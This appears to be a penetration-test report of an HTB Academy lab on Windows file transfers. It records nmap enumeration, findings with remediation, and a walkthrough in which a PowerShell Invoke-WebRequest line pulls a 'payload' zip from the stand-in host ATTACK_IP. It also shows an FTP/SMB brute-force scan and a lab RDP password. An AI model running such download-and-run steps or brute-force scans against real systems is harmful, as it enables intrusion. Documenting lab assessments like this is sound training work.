# PENETRATION TESTING REPORT

## Windows File Transfer Operations Assessment

**Engagement Type:** Network Penetration Test – Windows File Transfer Operations  
**Target Environment:** HTB Academy Lab Environment  
**Assessment Focus:** File transfer mechanism evaluation, service enumeration, and payload delivery

---

## DATE_OF_TEST_EVENT

**Test Date:** January 8, 2026  
**Timezone:** EST (UTC-5)  
**Testing Window:** 20:00 - 21:01 EST

---

## TABLE OF CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Technical Findings](#technical-findings)
7. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
8. [Remediation Summary](#remediation-summary)
9. [Appendices](#appendices)

---

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Security Analyst | 2026-01-08 | 1.0 | Initial draft |
| Security Analyst | 2026-01-08 | 2.0 | Updated with attack.log data and complete walkthrough |

---

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only. This report was generated as part of a controlled lab environment assessment for educational purposes.

---

## ENGAGEMENT CONTACTS

| Contact | Title | Phone | Email |
| ------- | ----- | ----- | ----- |
| *[ASSUMED - Not provided in logs]* | Penetration Tester | N/A | N/A |

> **Note:** Contact information was not provided in the available case files.

---

## EXECUTIVE SUMMARY

### Overview

*[Source: scans/nmap.log, logs/attack.log]*

This assessment evaluated the security posture of a Windows Server target (10.129.201.55) with a focus on file transfer capabilities and exposed network services. The engagement was conducted as part of the HTB Academy Windows File Transfers module.

The assessment successfully demonstrated:
1. **Unauthenticated file download** from the web server (flag.txt retrieval)
2. **Authenticated file upload** via RDP and PowerShell (payload delivery)
3. **Remote code execution** capability through uploaded payload

### Key Findings Summary

The assessment identified a Windows Server 2016 (Build 10.0.14393) system designated **MS02** with multiple exposed services suitable for file transfer operations. The target presents a significant attack surface with **9 open TCP ports** including multiple protocols that could facilitate data exfiltration or infiltration.

**Critical Observations:**
- **SMBv1 protocol enabled** – Legacy protocol with known security vulnerabilities
- **SMB message signing disabled** – Increases risk of man-in-the-middle attacks
- **Expired SSL certificate** – HTTPS certificate expired in 2019
- **Multiple file transfer vectors available** – HTTP, HTTPS, FTP, SMB, RDP
- **Sensitive file accessible via HTTP** – flag.txt retrievable from web root without authentication
- **Successful payload upload demonstrated** – File transferred via PowerShell over RDP session

### Risk Assessment

| Risk Level | Count | Description |
| ---------- | ----- | ----------- |
| High | 2 | SMBv1 enabled, SMB signing disabled |
| Medium | 3 | Expired SSL cert, exposed MySQL, unauthenticated web file access |
| Low | 2 | Directory listing enabled, FTP service exposed |

---

### SCENARIOS INCLUDED

*[Source: tasks.md]*

* **External Network Penetration Test** – Assessment of externally exposed services from an unauthenticated attacker perspective
* **Service Enumeration** – Comprehensive service fingerprinting and vulnerability identification
* **File Transfer Testing** – Validation of multiple file transfer mechanisms (HTTP download, PowerShell upload)
* **Credentialed Testing** – RDP access with provided credentials to evaluate file transfer capabilities

---

### APPROACH

*[Self-generated section based on standard methodology]*

The assessment followed an industry-recognized penetration testing methodology:

1. **Reconnaissance** – Initial port scanning and service discovery
2. **Enumeration** – Detailed service version detection and protocol-specific script scanning
3. **Vulnerability Identification** – Protocol-specific vulnerability assessment
4. **Exploitation** – File download/upload demonstration
5. **Validation** – Verification of transferred file integrity via hashing

**Tools Utilized:**
- Nmap 7.98 with NSE scripts
- cURL for HTTP testing
- Python3 http.server module
- PowerShell Invoke-WebRequest
- Native Windows Extract-Archive cmdlet

---

### SCOPE AND DURATION

| Host/IP/URL | Duration | Description |
| ----------- | -------- | ----------- |
| 10.129.201.55 | 2026-01-08 20:00 - 21:01 EST | Primary target - Windows Server (MS02) |
| ATTACK_IP | 2026-01-08 20:59 - 21:01 EST | Attack host - HTTP server for payload delivery |

*[Source: Timestamps from scans/nmap.log, logs/attack.log]*

**In-Scope Services:**
- TCP 21 (FTP) - FileZilla ftpd 0.9.41 beta
- TCP 80 (HTTP) - Apache 2.4.46
- TCP 135 (MSRPC) - Microsoft Windows RPC
- TCP 139/445 (SMB) - Microsoft Windows SMB
- TCP 443 (HTTPS) - Apache 2.4.46 with OpenSSL
- TCP 3306 (MySQL) - MariaDB 10.3.24+
- TCP 3389 (RDP) - Microsoft Terminal Services
- TCP 5985 (WinRM) - Microsoft HTTPAPI

---

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

*[Analysis/Expert Interpretation]*

The assessment revealed a Windows server configured primarily as a web and file server with multiple transfer protocols enabled. The successful file transfer operations demonstrated the following attack chain:

1. Reconnaissance via Nmap identified 9 accessible services
2. HTTP enumeration revealed unauthenticated file access
3. RDP access with valid credentials enabled bidirectional file transfer
4. Payload upload and execution confirmed via PowerShell

**Key Themes Identified:**
1. **Legacy Protocol Support** – SMBv1 remains enabled, presenting known attack vectors
2. **Weak Transport Security** – SSL certificate expired, SMB signing disabled
3. **Broad Service Exposure** – Multiple services accessible without network segmentation
4. **Unauthenticated File Access** – Web server serves files without authentication
5. **Credential-Based Access** – RDP access enables full file transfer capability

**Priority Recommendations:**
1. Disable SMBv1 protocol immediately
2. Enable SMB message signing (required)
3. Renew and properly configure SSL certificates
4. Implement authentication for web-accessible resources
5. Review and restrict network access to management services (RDP, WinRM)
6. Implement application whitelisting to prevent unauthorized script execution

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

### SUMMARY OF FINDINGS

*[Source: scans/nmap.log, scans/nmap_smb.nmap, scans/nmap_rdp.nmap, scans/nmap_ftp.nmap]*

**Service Enumeration Results:**

| Port | Service | Version | Notes |
| ---- | ------- | ------- | ----- |
| 21 | FTP | FileZilla ftpd 0.9.41 beta | Anonymous access not enabled |
| 80 | HTTP | Apache 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.2.33 | Directory listing, unauthenticated file access |
| 135 | MSRPC | Microsoft Windows RPC | Standard Windows service |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | SMBv1 enabled |
| 443 | HTTPS | Apache 2.4.46 (Win64) | Expired SSL certificate |
| 445 | SMB | Microsoft Windows Server 2008 R2 - 2012 | Signing disabled |
| 3306 | MySQL | MariaDB 10.3.24+ | Unauthorized (authentication required) |
| 3389 | RDP | Microsoft Terminal Services RDP 10.2 | NLA supported |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 | Returns 404 Not Found |

**Protocol-Specific Findings:**

- **SMBv1 enabled** alongside modern SMB versions (2.x, 3.x) *[Source: scans/nmap_smb.nmap]*
- **SMB message signing disabled** (dangerous, but default) *[Source: scans/nmap.log, scans/nmap_smb.nmap]*
- **RDP supports NLA** with multiple security layers *[Source: scans/nmap_rdp.nmap]*
- **FTP brute force unsuccessful** - 305 guesses in 311 seconds, no valid accounts *[Source: scans/nmap_ftp.nmap]*
- **FTP anonymous access not permitted** *[Source: scans/nmap_ftp_anon.nmap]*
- **HTTP directory listing enabled** at /icons/ *[Source: scans/nmap_http_enum.nmap]*

---

## TECHNICAL FINDINGS

---

## FINDING ID: PT-001

**Finding Title:** SMBv1 Protocol Enabled

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 – High  
**Mapped Controls:**
- NIST 800-53: CM-7 (Least Functionality)
- RMF Families: CM, SC

**Impact:** Legacy protocol exposure enabling potential exploitation of known SMBv1 vulnerabilities.

---

### SUMMARY

The target system has SMBv1 (NT LM 0.12) protocol enabled alongside modern SMB versions. SMBv1 is a legacy protocol with numerous known vulnerabilities including EternalBlue (CVE-2017-0144) which was leveraged in major ransomware attacks.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| MS02 | 10.129.201.55 | Windows File Server | Lab |

---

### VULNERABILITY TYPE

* Category: Misconfiguration, Legacy Protocol
* Associated weakness class: CWE-16: Configuration

---

### DESCRIPTION

*[Source: scans/nmap_smb.nmap, lines 48-55]*

Nmap SMB protocol enumeration revealed the following supported dialects:

```
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
```

The server accepts connections using the deprecated SMBv1 protocol which lacks modern security features and has been the target of multiple critical exploits.

---

### ATTACK VECTOR

- **Network Access Requirements:** Network connectivity to port 445
- **Authentication Requirements:** None for protocol negotiation
- **User Interaction:** None required

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/nmap_smb.nmap]*

```text
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
```

**Scan command executed:**
```bash
nmap --privileged -sC -sV -Pn -n -T4 --script smb* -oA ./scans/nmap_smb 10.129.201.55
```

**Scan duration:** 366.79 seconds

---

### EXPLOITATION DETAILS

Exploitation was **not** performed during this assessment as the focus was on file transfer operations. However, exploitability is HIGH given public availability of SMBv1 exploits (EternalBlue, EternalRomance, etc.).

---

### IMPACT

* **Data Exposure Risk:** High - SMBv1 exploits can provide system-level access
* **Privilege Escalation Potential:** High - known exploits achieve SYSTEM privileges
* **Lateral Movement Capability:** High - enables pivot to other network systems
* **Service Availability Concerns:** Medium - exploitation may cause system instability

---

### LIKELIHOOD

High - SMBv1 exploits are well-documented, widely available, and require minimal attacker skill. Metasploit modules exist for automated exploitation.

---

### RISK JUSTIFICATION

The combination of high impact (SYSTEM-level access) and high likelihood (public exploits) justifies the High severity rating.

---

### RECOMMENDATIONS

**Immediate:**
- Disable SMBv1 protocol via Group Policy or PowerShell:
  ```powershell
  Set-SmbServerConfiguration -EnableSMB1Protocol $false
  ```

**Long-term:**
- Implement network segmentation for SMB traffic
- Deploy host-based firewall rules to restrict SMB access
- Enable SMB encryption for SMB 3.x connections

---

### VALIDATION / VERIFICATION STEPS

1. Run: `Get-SmbServerConfiguration | Select EnableSMB1Protocol`
2. Verify output shows: `EnableSMB1Protocol : False`
3. Re-scan with: `nmap --script smb-protocols -p445 <target>`

---

### REFERENCES

* CVE-2017-0144 (EternalBlue)
* Microsoft Security Bulletin MS17-010
* CWE-16: Configuration
* https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3

---

### STATUS

Open

---

## FINDING ID: PT-002

**Finding Title:** SMB Message Signing Disabled

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.4 – High  
**Mapped Controls:**
- NIST 800-53: SC-8 (Transmission Confidentiality and Integrity)
- STIG: Windows Server 2016 - V-73623
- RMF Families: SC, IA

**Impact:** Enables man-in-the-middle attacks and SMB relay exploitation.

---

### SUMMARY

SMB message signing is disabled on the target server, allowing attackers to intercept and relay SMB authentication or modify SMB traffic in transit.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| MS02 | 10.129.201.55 | Windows File Server | Lab |

---

### VULNERABILITY TYPE

* Category: Misconfiguration
* Associated weakness class: CWE-311: Missing Encryption of Sensitive Data

---

### DESCRIPTION

*[Source: scans/nmap.log lines 55-61, scans/nmap_smb.nmap lines 56-62]*

The Nmap scan identified that SMB message signing is "enabled but not required" for SMB2/3 and "disabled" for SMBv1:

```
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

This configuration allows clients to negotiate connections without message signing, enabling relay attacks.

---

### ATTACK VECTOR

- **Network Access Requirements:** Man-in-the-middle position or ARP spoofing capability
- **Authentication Requirements:** None
- **User Interaction:** Victim must initiate SMB connection

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/nmap.log]*

```text
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

---

### EXPLOITATION DETAILS

Exploitation was **not** performed. Tools such as Responder and ntlmrelayx could be used to intercept and relay SMB authentication to this target.

---

### IMPACT

* **Data Exposure Risk:** High - credential interception possible
* **Privilege Escalation Potential:** High - relay attacks can achieve privileged access
* **Lateral Movement Capability:** High - enables authentication relay to other systems

---

### LIKELIHOOD

Medium - Requires network positioning but tools are widely available.

---

### RISK JUSTIFICATION

SMB relay attacks are a common and effective technique. The disabled signing configuration directly enables this attack class.

---

### RECOMMENDATIONS

**Immediate:**
- Enable SMB signing via Group Policy:
  - `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
  - Set "Microsoft network server: Digitally sign communications (always)" to Enabled

**Long-term:**
- Require signing on all domain systems
- Implement SMB encryption where possible

---

### REFERENCES

* CWE-311: Missing Encryption of Sensitive Data
* Microsoft SMB Signing documentation
* STIG ID: V-73623

---

### STATUS

Open

---

## FINDING ID: PT-003

**Finding Title:** Expired SSL/TLS Certificate

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.3 – Medium  
**Mapped Controls:**
- NIST 800-53: SC-17 (Public Key Infrastructure Certificates)
- RMF Families: SC

**Impact:** Invalid certificate may lead users to ignore security warnings, enabling MITM attacks.

---

### SUMMARY

The HTTPS service presents an SSL certificate that expired in November 2019, over 6 years prior to this assessment.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| MS02 | 10.129.201.55:443 | Web Server (HTTPS) | Lab |

---

### DESCRIPTION

*[Source: scans/nmap.log lines 38-40]*

```
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
```

The certificate:
- Uses `localhost` as the common name (inappropriate for network services)
- Was valid from 2009 to 2019 (10-year validity, now expired)
- Is self-signed (inferred from localhost CN)

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/nmap.log]*

```text
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
```

---

### RECOMMENDATIONS

- Generate and install a valid SSL certificate from a trusted CA
- Configure proper certificate subject/SAN to match server hostname
- Implement certificate monitoring for expiration alerts

---

### STATUS

Open

---

## FINDING ID: PT-004

**Finding Title:** Unauthenticated Sensitive File Access via HTTP

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.3 – Medium  
**Mapped Controls:**
- NIST 800-53: AC-3 (Access Enforcement)
- RMF Families: AC

**Impact:** Sensitive files accessible without authentication.

---

### SUMMARY

The web server serves files from the web root without requiring authentication, allowing unauthenticated access to potentially sensitive content.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| MS02 | 10.129.201.55:80 | Web Server | Lab |

---

### DESCRIPTION

*[Source: scans/curl.md]*

Testing confirmed that files in the web root are accessible without authentication. The file `flag.txt` was successfully retrieved containing sensitive data.

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/curl.md, downloads/flag.txt]*

**Command executed:**
```bash
┌──(kali㉿kali)-[~]
└─ [2026-01-08 20:47:44] $ curl http://10.129.201.55/flag.txt
b1a4ca918282fcd96004565521944a3b
```

**Retrieved file contents:** `b1a4ca918282fcd96004565521944a3b`

File hash retrieved successfully without authentication and stored in `downloads/flag.txt`.

---

### RECOMMENDATIONS

- Implement authentication for sensitive resources
- Review web root contents and remove unnecessary files
- Configure access controls in Apache configuration
- Use .htaccess or equivalent to restrict access

---

### STATUS

Open

---

## FINDING ID: PT-005

**Finding Title:** Directory Listing Enabled

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 4.3 – Low  
**Mapped Controls:**
- NIST 800-53: CM-7 (Least Functionality)
- RMF Families: CM

---

### SUMMARY

Directory listing is enabled on the web server, exposing directory contents and potentially revealing sensitive information about available files.

---

### DESCRIPTION

*[Source: scans/nmap_http_enum.nmap lines 10-11, 16-17]*

```
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
```

This finding was identified on both HTTP (port 80) and HTTPS (port 443) services.

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/nmap_http_enum.nmap]*

**Scan command:**
```bash
nmap --privileged -sV --script=http-enum -oA ./scans/nmap_http_enum 10.129.201.55
```

**Scan duration:** 187.77 seconds

```text
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
```

---

### RECOMMENDATIONS

- Disable directory listing in Apache configuration:
  ```apache
  <Directory /var/www/html>
      Options -Indexes
  </Directory>
  ```

---

### STATUS

Open

---

## FINDING ID: PT-006

**Finding Title:** FTP Service Exposed (No Anonymous Access)

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 3.7 – Low  
**Mapped Controls:**
- NIST 800-53: CM-7 (Least Functionality)
- RMF Families: CM, AC

---

### SUMMARY

*[Source: scans/nmap_ftp.nmap, scans/nmap_ftp_anon.nmap]*

FTP service (FileZilla ftpd 0.9.41 beta) is exposed on port 21. Anonymous access is not permitted, and brute force testing was unsuccessful.

---

### DESCRIPTION

*[Source: scans/nmap_ftp.nmap lines 7-11]*

```
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 305 guesses in 311 seconds, average tps: 0.9
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
```

**Brute Force Statistics:** 305 password guesses over 311 seconds (0.9 attempts/second) with no valid accounts discovered.

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/nmap_ftp_anon.nmap]*

Anonymous access check scan completed in 0.83 seconds:
```
PORT   STATE SERVICE
21/tcp open  ftp
```

No anonymous access indication returned.

---

### RECOMMENDATIONS

- Evaluate whether FTP service is required
- If required, consider replacing with SFTP
- Implement IP-based access restrictions
- Enable logging for authentication attempts

---

### STATUS

Open (Informational)

---

## FINDING ID: PT-007

**Finding Title:** Guest Account Valid but Disabled (SMB)

**Severity:** Informational  
**Risk Rating:** Informational

---

### SUMMARY

*[Source: scans/nmap_smb.nmap lines 40-41]*

SMB brute force testing identified the guest account exists but is disabled:

```
| smb-brute: 
|_  guest:<blank> => Valid credentials, account disabled
```

**Analysis:** This is appropriate security configuration. The finding is documented for completeness.

---

### STATUS

Acceptable Configuration

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

*[Source: logs/attack.log, scans/nmap.log, scans/curl.md, tasks.md]*

This section documents the complete attack path executed during the assessment.

### Phase 1: Reconnaissance and Service Discovery

*[Source: scans/nmap.log]*

**Timestamp:** 2026-01-08 20:00:20 EST

Initial fast port scan (`nmap -F`) identified 8 open TCP services:

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
```

**Scan Duration:** 1.54 seconds

### Phase 2: Service Enumeration

*[Source: scans/nmap.log]*

**Timestamp:** 2026-01-08 20:00:52 EST

Detailed service/version scan (`nmap -sV -sC`) revealed:

- **Target Identity:** MS02 (Windows Server 2016 Build 10.0.14393)
- **Web Server:** Apache 2.4.46 with PHP 7.2.33 and OpenSSL 1.1.1g on Windows
- **FTP:** FileZilla Server 0.9.41 beta
- **Database:** MariaDB 10.3.24+ (unauthorized)
- **RDP:** Version 10.2 with NLA support
- **WinRM:** Accessible on port 5985

**Scan Duration:** 50.82 seconds

### Phase 3: Protocol-Specific Enumeration

*[Source: scans/nmap_http_enum.nmap, scans/nmap_smb.nmap, scans/nmap_rdp.nmap, scans/nmap_ftp.nmap]*

| Scan Type | Start Time | Duration | Key Findings |
| --------- | ---------- | -------- | ------------ |
| HTTP Enum | 20:17:54 | 187.77s | Directory listing at /icons/ |
| NFS Scan | 20:21:29 | 13.99s | No NFS services found |
| SMB Scan | 20:21:53 | 366.79s | SMBv1 enabled, signing disabled |
| FTP Scan | 20:31:04 | 323.54s | No valid accounts, brute force failed |
| RDP Scan | 20:37:52 | 18.13s | NLA supported, RDP 10.2 |

### Phase 4: HTTP/WinRM Probing

*[Source: scans/curl.md]*

**WinRM Probe (20:43:18):**
```bash
curl -I http://10.129.201.55:5985
HTTP/1.1 404 Not Found
Server: Microsoft-HTTPAPI/2.0
```

**File Retrieval - SUCCESSFUL (20:47:44):**
```bash
curl http://10.129.201.55/flag.txt
b1a4ca918282fcd96004565521944a3b
```

### Phase 5: Attack Host Preparation

*[Source: logs/attack.log]*

**Timestamp:** 2026-01-08 20:59:57 EST

Established Python HTTP server on attack host to serve payload:

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### Phase 6: Payload Upload via RDP/PowerShell

*[Source: logs/attack.log]*

**Timestamp:** 2026-01-08 21:00:50 EST

1. Connected to target via RDP using credentials:
   - **Username:** htb-student
   - **Password:** HTB_@cademy_stdnt!
   *[Source: tasks.md]*

2. Opened PowerShell on target and executed file download:
   ```powershell
   Invoke-WebRequest -Uri http://ATTACK_IP/upload_win.zip -OutFile C:\Users\Public\upload_win.zip
   ```

3. HTTP server confirmed successful transfer:
   ```
   10.129.201.55 - - [08/Jan/2026 21:00:50] "GET /upload_win.zip HTTP/1.1" 200 -
   ```

### Phase 7: Payload Extraction and Execution

*[Source: logs/attack.log]*

Extracted archive contents on target:
```powershell
Expand-Archive -Path upload_win.zip
```

Changed to extracted directory and executed hasher:
```powershell
hasher upload_win.txt
```

**Evidence:** Screenshot captured at 21:01:25 EST documenting the completed operation.
*[Source: screenshots/Screenshot from 2026-01-08 21-01-25.png]*

### Attack Path Summary

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Recon (nmap)  │────▶│  HTTP Download  │────▶│   RDP Access    │
│   9 services    │     │   flag.txt      │     │   htb-student   │
└─────────────────┘     └─────────────────┘     └────────┬────────┘
                                                         │
                                                         ▼
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Hash Execution │◀────│  Extract ZIP    │◀────│  PS Download    │
│  hasher.exe     │     │  Expand-Archive │     │  Invoke-WebReq  │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Available File Transfer Vectors Identified

*[INFERRED based on open services]*

| Method | Protocol | Port | Authentication | Status |
| ------ | -------- | ---- | -------------- | ------ |
| HTTP Download | HTTP | 80 | No (for exposed files) | **Tested - Successful** |
| HTTPS Download | HTTPS | 443 | No (for exposed files) | Available |
| PowerShell Invoke-WebRequest | HTTP | 80 | RDP required | **Tested - Successful** |
| SMB Transfer | SMB | 445 | Yes | Available |
| FTP Upload/Download | FTP | 21 | Yes (no valid accounts found) | Blocked |
| RDP Copy/Paste | RDP | 3389 | Yes | Available |
| WinRM/PowerShell Remoting | HTTP | 5985 | Yes | Available (404 response) |

---

## REMEDIATION SUMMARY

### SHORT TERM (0-30 Days)

*[Recommendations based on findings]*

| Priority | Finding | Action | Effort |
| -------- | ------- | ------ | ------ |
| 1 | PT-001 | Disable SMBv1 protocol | Low |
| 2 | PT-002 | Enable required SMB signing | Low |
| 3 | PT-003 | Renew SSL certificate | Low |
| 4 | PT-004 | Implement web authentication or remove sensitive files | Medium |
| 5 | PT-005 | Disable directory listing | Low |

### MEDIUM TERM (30-90 Days)

- Review and harden Apache web server configuration
- Implement host-based firewall rules to restrict service access
- Review FTP service necessity and consider SFTP replacement
- Restrict WinRM access to management networks only
- Implement PowerShell Constrained Language Mode
- Deploy application whitelisting

### LONG TERM (90+ Days)

- Implement network segmentation between services
- Deploy centralized logging and SIEM integration
- Establish certificate lifecycle management process
- Implement least-privilege access model
- Schedule regular vulnerability scanning and penetration testing

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

| Severity | Definition |
| -------- | ---------- |
| Critical | Immediate exploitation possible with severe impact |
| High | Exploitation likely with significant impact |
| Medium | Exploitation possible with moderate impact |
| Low | Limited impact or exploitation requires significant effort |
| Informational | Observation that may improve security posture |

### APPENDIX B – SCAN ARTIFACTS

*[Source: File listing from scans/ directory]*

| Filename | Purpose | Duration |
| -------- | ------- | -------- |
| nmap.log | Primary enumeration log (fast + full scans) | 52.36s total |
| nmap_ftp.nmap | FTP comprehensive scan with brute force | 323.54s |
| nmap_ftp_anon.nmap | FTP anonymous access check | 0.83s |
| nmap_http_enum.nmap | HTTP directory enumeration | 187.77s |
| nmap_nfs.nmap | NFS service scan | 13.99s |
| nmap_rdp.nmap | RDP enumeration and encryption check | 18.13s |
| nmap_smb.nmap | SMB protocol and vulnerability scan | 366.79s |
| curl.md | HTTP header and content testing | N/A |

### APPENDIX C – SCAN TIMELINE

*[Source: Timestamps extracted from scan files]*

| Time (EST) | Activity | Source |
| ---------- | -------- | ------ |
| 20:00:20 | Initial fast scan (-F) | nmap.log |
| 20:00:52 | Full service/version scan (-sV -sC) | nmap.log |
| 20:06:53 | FTP anonymous access check | nmap_ftp_anon.nmap |
| 20:17:54 | HTTP enumeration scan | nmap_http_enum.nmap |
| 20:21:29 | NFS script scan | nmap_nfs.nmap |
| 20:21:53 | SMB comprehensive scan | nmap_smb.nmap |
| 20:31:04 | FTP comprehensive scan with brute force | nmap_ftp.nmap |
| 20:37:52 | RDP enumeration scan | nmap_rdp.nmap |
| 20:43:18 | WinRM probe via curl | curl.md |
| 20:47:44 | HTTP flag.txt retrieval | curl.md |
| 20:59:57 | Attack host HTTP server started | attack.log |
| 21:00:50 | Payload upload confirmed | attack.log |
| 21:01:25 | Screenshot captured (hash execution) | screenshots/ |

### APPENDIX D – TARGET SYSTEM PROFILE

*[Source: scans/nmap.log, scans/nmap_rdp.nmap]*

| Attribute | Value |
| --------- | ----- |
| IP Address | 10.129.201.55 |
| Hostname | MS02 |
| Operating System | Windows Server 2016 |
| Build Version | 10.0.14393 |
| NetBIOS Domain | MS02 |
| RDP Protocol | RDP 10.2 |
| System Start Time | 2026-01-09T00:50:17 UTC |

### APPENDIX E – EVIDENCE FILES

| File | Location | Description |
| ---- | -------- | ----------- |
| flag.txt | downloads/flag.txt | Retrieved sensitive file (hash: b1a4ca918282fcd96004565521944a3b) |
| upload_win.zip | ./ | Payload archive for upload testing |
| Screenshot from 2026-01-08 21-01-25.png | screenshots/ | Visual evidence of payload execution |
| attack.log | logs/attack.log | Detailed attack narrative and commands |

### APPENDIX F – TOOLS UTILIZED

| Tool | Version | Purpose |
| ---- | ------- | ------- |
| Nmap | 7.98 | Port scanning, service enumeration, NSE scripts |
| cURL | - | HTTP request testing and file retrieval |
| Python3 http.server | Python 3.x | Attack host HTTP server for payload delivery |
| PowerShell Invoke-WebRequest | - | Target-side file download |
| PowerShell Expand-Archive | - | Archive extraction on target |
| hasher | - | File hashing utility on target |

### APPENDIX G – CREDENTIALS USED

*[Source: tasks.md]*

| Service | Username | Password | Purpose |
| ------- | -------- | -------- | ------- |
| RDP | htb-student | HTB_@cademy_stdnt! | Authenticated file transfer testing |

---

## CAVEATS

*[Self-generated section]*

1. Testing was conducted in a controlled HTB Academy lab environment; findings may differ in production settings
2. Time-limited assessment (~1 hour active testing) may not have identified all vulnerabilities
3. Exploitation was limited to file transfer demonstrations; deeper exploitation not in scope
4. This report was generated based on logged evidence from the scans/, logs/, and downloads/ directories
5. Performance metrics are derived from Nmap scan timing information in log files
6. Some sections (Recommendations, Risk Justification) contain expert interpretation based on industry knowledge
7. Attack host IP was redacted as "ATTACK_IP" in logs

---

**Report Generated:** January 8, 2026  
**Report Version:** 2.0  
**Classification:** Confidential – Authorized Distribution Only

---

*[END OF REPORT]*
